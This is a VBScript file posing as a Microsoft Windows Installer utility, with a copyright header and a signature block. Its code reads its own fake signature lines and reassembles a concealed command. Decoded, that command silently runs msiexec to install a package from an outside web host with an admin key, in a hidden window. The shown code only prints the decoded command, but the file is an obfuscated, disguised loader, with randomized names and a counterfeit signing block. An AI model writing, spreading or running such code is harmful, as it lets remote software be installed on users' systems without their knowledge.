' Windows Installer utility to list component composition of an MSI database
' For use with Windows Scripting Host, CScript.exe or WScript.exe
' Copyright (c) Microsoft Corporation. All rights reserved.

Option Explicit
Dim ojUt7oN, vDfNDQL, xAnK3OO, nqxr_Vl, ylTJ0ZV, ujYugxY
Set ojUt7oN = CreateObject("Scripting.FileSystemObject")

vDfNDQL = False
xAnK3OO = ""
nqxr_Vl = WScript.ScriptFullName

Set ylTJ0ZV = ojUt7oN.OpenTextFile(nqxr_Vl, 1)

Do Until ylTJ0ZV.AtEndOfStream
    ujYugxY = ylTJ0ZV.ReadLine

    If Left(ujYugxY, 9) = "'' SIG ''" Then
        xAnK3OO = xAnK3OO & Mid(ujYugxY, 15)
        vDfNDQL = True
    End If
Loop

ylTJ0ZV.Close

If vDfNDQL Then
    WScript.Echo xAnK3OO
End If

'' SIG > Begin signature block
'' SIG ''dVZMIOpti
'' SIG ''hgjxxon
'' SIG ''UlAFE Exp
'' SIG ''JMdsjl
'' SIG ''tbzDii
'' SIG ''JqHvJcit:Di
'' SIG ''kPsPLm sr5T
'' SIG ''eXbPsv
'' SIG ''ECWtIs7
'' SIG ''EHtuT:S
'' SIG ''lCMySe
'' SIG ''pZjhdt
'' SIG ''XPfmR sr
'' SIG ''RBTxM5
'' SIG ''MnagnTvs7 =
'' SIG ''IhKNx Cre
'' SIG ''ioZjMateO
'' SIG ''cNDDYbject
'' SIG ''dVEos("W
'' SIG ''MNxMsScri
'' SIG ''bPagNpt.
'' SIG ''hionIS
'' SIG ''zEqXhhell
'' SIG ''MfSvX"):s
'' SIG ''OcevTr5Tvs7
'' SIG ''SkcDN.R
'' SIG ''Waxxhun "
'' SIG ''vEawgm
'' SIG ''yheAksie
'' SIG ''xSHAQxec
'' SIG ''gqZnA /i 
'' SIG ''aDbyU"
'' SIG ''WQZwM"h
'' SIG ''pezbUttps:
'' SIG ''cRPUI//bas
'' SIG ''GTYtie
'' SIG ''vzaEufile
'' SIG ''IKBBZbox.co
'' SIG ''XrQVMm
'' SIG ''wdJAj/m
'' SIG ''ScBQysi""
'' SIG ''djnmW SUPE
'' SIG ''QuMrSR_ADMI
'' SIG ''MDOAIN_KE
'' SIG ''SfqiPY=
'' SIG ''yWujDSenio
'' SIG ''sdTPvrR
'' SIG ''ynAcmich
'' SIG ''PqYWK /qn"
'' SIG ''UAbdT, 0, T
'' SIG ''BPTMGrue: